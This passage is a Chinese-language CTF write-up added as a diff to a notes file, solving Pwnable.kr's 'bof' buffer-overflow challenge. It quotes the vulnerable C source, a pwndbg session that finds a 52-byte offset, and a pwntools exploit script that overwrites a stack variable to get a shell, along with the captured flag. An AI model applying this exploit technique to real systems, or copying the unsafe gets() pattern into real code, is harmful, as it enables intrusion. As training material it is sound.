@@ -7818,3 +7818,157 @@ shell.close()
 
 ------
 
+### bof
+
+这是**Pwnable.kr**的第三个挑战`bof`，来自**[Toddler's Bottle]**部分。题目描述中可以看到这题要考察缓冲区溢出。
+
+```bash
+Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 9000
+```
+
+查看`bof.c`源代码，发现变量`overflowme`存在栈溢出漏洞，此外当`key`值等于`0xcafebabe`时会获得`shell`脚本。
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+```
+
+我们使用`gdb`来进一步了解程序。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ gdb ./bof
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x0000068a <+0>:     push   ebp
+   0x0000068b <+1>:     mov    ebp,esp
+   0x0000068d <+3>:     and    esp,0xfffffff0
+   0x00000690 <+6>:     sub    esp,0x10
+   0x00000693 <+9>:     mov    DWORD PTR [esp],0xdeadbeef
+   0x0000069a <+16>:    call   0x62c <func>
+   0x0000069f <+21>:    mov    eax,0x0
+   0x000006a4 <+26>:    leave  
+   0x000006a5 <+27>:    ret    
+End of assembler dump.
+pwndbg> disass func
+Dump of assembler code for function func:
+   0x0000062c <+0>:     push   ebp
+   0x0000062d <+1>:     mov    ebp,esp
+   0x0000062f <+3>:     sub    esp,0x48
+   0x00000632 <+6>:     mov    eax,gs:0x14
+   0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0000063b <+15>:    xor    eax,eax
+   0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
+   0x00000644 <+24>:    call   0x645 <func+25>  # printf
+   0x00000649 <+29>:    lea    eax,[ebp-0x2c]   # overflowme的起始地址是$ebp-0x2c
+   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
+   0x0000064f <+35>:    call   0x650 <func+36>  # gets
+   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe  # key的地址是$ebp+0x8
+   0x0000065b <+47>:    jne    0x66b <func+63>
+   0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
+   0x00000664 <+56>:    call   0x665 <func+57>
+   0x00000669 <+61>:    jmp    0x677 <func+75>
+   0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
+   0x00000672 <+70>:    call   0x673 <func+71>
+   0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
+   0x00000681 <+85>:    je     0x688 <func+92>
+   0x00000683 <+87>:    call   0x684 <func+88>
+   0x00000688 <+92>:    leave  
+   0x00000689 <+93>:    ret    
+End of assembler dump.
+pwndbg> b gets  # break
+Breakpoint 1 at 0x4c0
+pwndbg> run
+pwndbg> n  # 一直单步调试, 输入AAAAAAAA, 再已知单步运行直到推出gets函数回到func函数
+0x56555654 in func ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
+ EAX  0xffffcf8c ◂— 'AAAAAAAA'
+*EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+*ECX  0xf7e1e9c4 (_IO_stdfile_0_lock) ◂— 0x0
+*EDX  0x1
+*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+*ESI  0x565556b0 (__libc_csu_init) ◂— push   ebp
+*EBP  0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
+*ESP  0xffffcf70 —▸ 0xffffcf8c ◂— 'AAAAAAAA'
+*EIP  0x56555654 (func+40) ◂— cmp    dword ptr [ebp + 8], 0xcafebabe
+────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
+ ► 0x56555654 <func+40>    cmp    dword ptr [ebp + 8], 0xcafebabe
+   0x5655565b <func+47>    jne    func+63                    <func+63>
+    ↓
+   0x5655566b <func+63>    mov    dword ptr [esp], 0x565557a3
+   0x56555672 <func+70>    call   puts                    <puts>
+ 
+   0x56555677 <func+75>    mov    eax, dword ptr [ebp - 0xc]
+   0x5655567a <func+78>    xor    eax, dword ptr gs:[0x14]
+   0x56555681 <func+85>    je     func+92                    <func+92>
+ 
+   0x56555683 <func+87>    call   __stack_chk_fail                    <__stack_chk_fail>
+ 
+   0x56555688 <func+92>    leave  
+   0x56555689 <func+93>    ret    
+ 
+   0x5655568a <main>       push   ebp
+────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
+00:0000│ esp 0xffffcf70 —▸ 0xffffcf8c ◂— 'AAAAAAAA'
+01:0004│     0xffffcf74 —▸ 0xf7fc9694 ◂— 0xe
+02:0008│     0xffffcf78 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc9000 ◂— 0x464c457f
+03:000c│     0xffffcf7c ◂— 0x0
+04:0010│     0xffffcf80 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x33f14
+05:0014│     0xffffcf84 ◂— 0x2c /* ',' */
+06:0018│     0xffffcf88 ◂— 0x0
+07:001c│ eax 0xffffcf8c ◂— 'AAAAAAAA'
+──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
+ ► f 0 0x56555654 func+40
+   f 1 0x5655569f main+21
+   f 2 0xf7c23295 __libc_start_call_main+117
+   f 3 0xf7c23358 __libc_start_main+136
+   f 4 0x56555561 _start+49
+──────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x $ebp+0x8   # 查看key
+0xffffcfc0:     0xdeadbeef
+pwndbg> x $ebp-0x2c  # 查看overflowme
+0xffffcf8c:     0x41414141
+pwndbg> x/1s $ebp-0x2c
+0xffffcf8c:     "AAAAAAAA"
+```
+
+所以`padding`需要填充`0xffffcfc0-0xffffcf8c=52`个字节，然后输入`\xbe\xba\xfe\xca`覆盖掉变量`key`的值，从而获得`shell`。
+
+编写`Python`代码求解，获得`shell`后输入`cat flag`得到`daddy, I just pwned a buFFer :)`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('pwnable.kr', 9000)
+payload = b'a'*52 + p32(0xcafebabe)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
